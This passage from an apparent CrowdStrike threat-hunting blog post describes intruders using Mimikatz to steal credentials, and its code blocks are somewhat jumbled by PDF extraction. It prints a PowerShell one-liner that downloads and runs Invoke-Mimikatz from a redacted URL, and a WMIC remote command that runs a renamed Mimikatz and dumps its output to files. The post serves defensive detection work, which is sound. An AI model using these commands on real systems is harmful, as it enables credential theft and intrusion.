Actors often seek out\nvalid credentials in order to escalate their privileges and extend their reach within an infrastructure\n— and they do so via a variety of means. In fact, the OverWatch team has previously observed\ncases in which adversaries have employed multiple credential theft techniques against a single\nvictim. (An example of adversaries using multiple credential techniques is included in the 2018\nFalcon OverWatch Report.)\n\n\n-----\n\n## Mimikatz Techniques\n\n[One popular means of credential access is the use of Mimikatz, described as the “AK47 of cyber” by](https://twitter.com/dalperovitch/status/826309879086342144)\nCrowdStrike Co-Founder and CTO Dmitri Alperovitch. The OverWatch team regularly sees Mimikatz\nused by both targeted adversaries and pen testers.\n\n### Changing the Executable Name\n\nThe most simple and direct technique for using this tool is for the actor to copy it to a compromised\nsystem, change the name of the executable and launch it using, for example, the following\ncommand line:\n\n```\n\"\"sekurlsa::logonpasswords\"\"\n\n```\n\nThis allows the actor to access credential information on a system.\n\n### Using a Batch File\n\nOther means of launching this tool that have been observed include using a batch file to copy the\ntool over to target systems; launching the tool and sending the output to a file; copying the output\nfiles back to a central collection point; and finally, deleting all relevant files off of the target systems.\n\n### Using a PowerShell Variant\n\nAnother means of gaining access to credential information that OverWatch analysts have observed\nis the use of a [PowerShell variant of Mimikatz, as seen in the following example:](https://www.crowdstrike.com/blog/is-there-such-a-thing-as-a-malicious-powershell-command/)\n```\npowershell -ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object\nNet.WebClient).DownloadString('https://raw.githubusercontent[.]com/[REDACTED]/InvokeMimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug\n\n```\nsekurlsa :: logonpasswords exit'\n\n### Changing Command Line Options\n\nDuring the last quarter of 2018, OverWatch analysts observed a different use of the Mimikatz tool,\nspecifically one that appears to have been modified to change the command line options. It appears\nas follows:\n\n`mnl.exe pr::dg` sl ::lp et -p\n\nThis specific variant of Mimikatz was run against multiple target systems through the use of\nWMIC.exe, as illustrated below:\n```\nWmic /NODE:\"[REDACTED]\" /USER:\"[REDACTED]\" /password:[REDACTED] process call\n\n```\n`create \"cmd.exe /c (c:\\windows\\security\\mnl.exe pr::dg` sl ::lp et -p\n```\n>c:\\windows\\security\\PList.txt) >> c:\\windows\\temp\\temp.txt\"\n\n## Monitoring for IOAs Is Crucial\n\n```\n\n-----\n\nThese techniques are clearly an attempt to evade brittle detection approaches that only rely on\nlooking at command line options of the executable to infer its purpose, or checking for presence of\nrelevant strings in the binary file. While there are a number of techniques that actors can employ to\n[access credential information, the Falcon platform provides a level of visibility that allows defenders](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/)\nto see new techniques being used, even when those techniques are specifically aimed at evading or\nsubverting detection mechanisms.\n\n[This further demonstrates the value of monitoring for Indicators of attack (IOAs), which focus on](https://www.crowdstrike.com/blog/understanding-indicators-attack-ioas-power-event-stream-processing-crowdstrike-falcon/)\nbehavioral aspects of attacker techniques, rather than focusing only on typical indicators of\ncompromise (IOCs), such as file names, hashes or single command line options.\n\n**Additional Resources**\n\n_[Download the 2020 CrowdStrike Global Threat Report](https://www.crowdstrike.com/resources/reports/2020-crowdstrike-global-threat-report/)_\n_[Download the 2018 CrowdStrike Falcon OverWatch Report.](https://www.crowdstrike.com/resources/reports/observations-from-the-front-lines-of-threat-hunting/?ctm_source=Website&ctm_medium=Blog&ctm_campaign=Blog-Inline-Copy)_\n_Test CrowdStrike next-gen AV for yourself:_ _[Start your free trial of Falcon Prevent™ today.](https://go.crowdstrike.com/try-falcon-prevent.html?ctm_source=Website&ctm_medium=Blog&ctm_campaign=Blog-Inline-Copy)_\n\nRelated Content\n\nCompromised Docker Honeypots Used for Pro-Ukrainian DoS Attack\n\n\n-----\n\nNavigating the Five Stages of Grief During a Breach\n\nLemonDuck Targets Docker for Cryptomining Operations\n\n\n-----\n\n-----",
